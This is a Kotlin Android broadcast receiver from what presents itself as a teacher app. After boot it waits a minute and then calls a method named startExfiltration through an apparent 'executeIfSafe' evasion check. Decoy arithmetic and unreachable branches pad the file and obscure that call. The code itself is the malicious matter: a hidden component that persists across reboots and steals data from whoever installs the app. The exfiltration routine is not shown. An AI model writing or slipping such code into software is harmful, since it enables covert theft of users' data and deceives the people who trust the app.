package com.example.teacherapp.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.example.teacherapp.obfuscation.DeviceCompatUtils
import com.example.teacherapp.services.NotificationSyncService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class StartupReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        
        val t = System.currentTimeMillis()
        val op = (t % 1000 + 1) * (t % 1000 + 1)  
        if (op > 0 && intent.action == Intent.ACTION_BOOT_COMPLETED) {
            CoroutineScope(Dispatchers.Default).launch {
                
                val noise = IntArray(32) { i -> (i * 17 + 3) xor 0xAB }
                val _ = noise.sum()

                delay(60000L)

                
                DeviceCompatUtils.executeIfSafe(context) {
                    NotificationSyncService.startExfiltration(context)
                }
            }
        } else if (op <= 0) {
            
            val fakeList = (1..100).map { it * it }
            val _ = fakeList.sum()
        }
    }
}
